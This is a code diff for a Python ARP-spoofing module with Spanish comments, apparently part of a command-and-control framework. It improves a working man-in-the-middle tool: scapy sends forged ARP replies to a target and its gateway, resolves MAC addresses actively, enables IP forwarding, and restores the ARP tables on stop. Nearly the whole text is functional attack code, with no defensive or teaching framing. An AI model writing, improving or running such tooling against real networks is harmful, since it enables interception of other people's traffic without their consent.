@@ -5,10 +5,10 @@ from __future__ import annotations
 import threading
 
 try:
-    from scapy.all import ARP, getmacbyip, send
+    from scapy.all import ARP, Ether, sendp, srp
     _SCAPY_AVAILABLE = True
 except ImportError:  # pragma: no cover - entorno mínimo sin scapy
-    ARP = getmacbyip = send = None  # type: ignore[assignment]
+    ARP = Ether = sendp = srp = None  # type: ignore[assignment]
     _SCAPY_AVAILABLE = False
 
 from app.c2.core.bus import bus
@@ -18,8 +18,8 @@ def enable_ip_forward() -> None:
     try:
         with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
             f.write("1")
-    except Exception as e:
-        bus.emit({"type": "error", "msg": f"No se pudo habilitar ip_forward: {e}"})
+    except OSError as e:
+        raise RuntimeError(f"No se pudo habilitar ip_forward: {e}") from e
 
 
 class ArpSpoofer:
@@ -37,38 +37,47 @@ class ArpSpoofer:
 
     def _poison(self) -> None:
         # Al objetivo le decimos que nosotros somos el gateway.
-        send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip),
-             iface=self.iface, verbose=0)
+        sendp(Ether(dst=self.target_mac) / ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip),
+              iface=self.iface, verbose=0)
         # Al gateway le decimos que nosotros somos el objetivo.
-        send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip),
-             iface=self.iface, verbose=0)
+        sendp(Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip),
+              iface=self.iface, verbose=0)
 
     def _restore(self) -> None:
         # Restauracion robusta: unicast a cada parte y broadcast, con varias
         # repeticiones espaciadas para asegurar que las tablas ARP se corrigen.
-        send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac,
+        sendp(Ether(dst=self.target_mac) / ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac,
                  psrc=self.gateway_ip, hwsrc=self.gateway_mac),
              count=8, inter=0.5, iface=self.iface, verbose=0)
-        send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
+        sendp(Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                  psrc=self.target_ip, hwsrc=self.target_mac),
              count=8, inter=0.5, iface=self.iface, verbose=0)
-        send(ARP(op=2, pdst=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff",
+        sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                  psrc=self.gateway_ip, hwsrc=self.gateway_mac),
              count=8, inter=0.5, iface=self.iface, verbose=0)
-        send(ARP(op=2, pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
+        sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
                  psrc=self.target_ip, hwsrc=self.target_mac),
              count=8, inter=0.5, iface=self.iface, verbose=0)
 
     def _run(self) -> None:
-        while not self._stop.is_set():
-            self._poison()
-            bus.emit({"type": "arp",
-                      "msg": f"Envenenando {self.target_ip} <-> {self.gateway_ip}"})
-            self._stop.wait(self.interval)
+        try:
+            while not self._stop.is_set():
+                self._poison()
+                bus.emit({"type": "arp",
+                          "msg": f"Envenenando {self.target_ip} <-> {self.gateway_ip}"})
+                self._stop.wait(self.interval)
+        except Exception as e:
+            bus.emit({"type": "error", "msg": f"MITM ARP interrumpido: {e}"})
+
+    @property
+    def running(self) -> bool:
+        return self._started and self._thread is not None and self._thread.is_alive()
 
     def start(self) -> None:
-        self.target_mac = getmacbyip(self.target_ip)
-        self.gateway_mac = getmacbyip(self.gateway_ip)
+        if not _SCAPY_AVAILABLE:
+            raise RuntimeError("Scapy no está instalado en el entorno C2")
+        self.target_mac = self._resolve_mac(self.target_ip)
+        self.gateway_mac = self._resolve_mac(self.gateway_ip)
         if not self.target_mac or not self.gateway_mac:
             raise RuntimeError("No se pudo resolver la MAC del objetivo o del gateway")
         # Guardamos el valor previo de ip_forward para restaurarlo al parar.
@@ -83,6 +92,11 @@ class ArpSpoofer:
         self._thread = threading.Thread(target=self._run, daemon=True)
         self._thread.start()
         bus.emit({"type": "arp", "msg": f"MITM activo contra {self.target_ip}"})
+
+    def _resolve_mac(self, address: str) -> str | None:
+        answers, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=address),
+                         iface=self.iface, timeout=2, verbose=0)
+        return answers[0][1].hwsrc if answers else None
 
     def stop(self) -> None:
         if not self._started:
@@ -99,8 +113,8 @@ class ArpSpoofer:
         else:
             try:
                 self._restore()
-            except Exception:
-                pass
+            except Exception as e:
+                bus.emit({"type": "error", "msg": f"No se pudieron restaurar las tablas ARP: {e}"})
         # Restaurar ip_forward al valor original (solo si lo llegamos a tocar).
         if self._ipfwd_prev is not None:
             try:
@@ -108,4 +122,4 @@ class ArpSpoofer:
                     f.write(self._ipfwd_prev)
             except Exception:
                 pass
-        bus.emit({"type": "arp", "msg": "MITM detenido, tablas ARP restauradas"})
+        bus.emit({"type": "arp", "msg": "MITM detenido"})
